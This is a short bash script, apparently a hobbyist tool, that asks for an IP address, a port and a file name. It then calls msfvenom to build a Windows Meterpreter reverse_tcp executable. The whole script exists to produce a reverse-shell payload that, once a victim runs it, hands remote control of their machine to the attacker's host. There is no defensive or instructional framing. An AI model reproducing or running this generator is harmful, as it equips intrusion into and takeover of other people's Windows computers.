clear
sleep 1

toilet WELCOME  --gay
sleep 1
echo " "
echo "Metasploit Payload Generator "
sleep 1
echo " "
echo "-------------------'Tool By Abhi'---------------------------"
sleep 1
echo " "
echo "payload creator.........."
sleep 1
echo " "
echo "plz enter your ip : "
read ip
sleep 1
echo " "
echo "Enter The Port You Want For Your Payload: "
read port
sleep 1
echo " "
echo "Enter The Name Of Your Payload (must include .exe, for ex: name.exe )"
read name
sleep 1
echo " "
echo "Creating Payload With This ip >"$ip  "  and with this port" $port
sleep 1
echo " "
echo "      This Wont Take Much Time. "
read -p "Are you sure? (y/n) " -n 1 -r
echo    # (optional) move to a new line
if [[ $REPLY =~ ^[Yy]$ ]]
then
msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port -o $name
fi
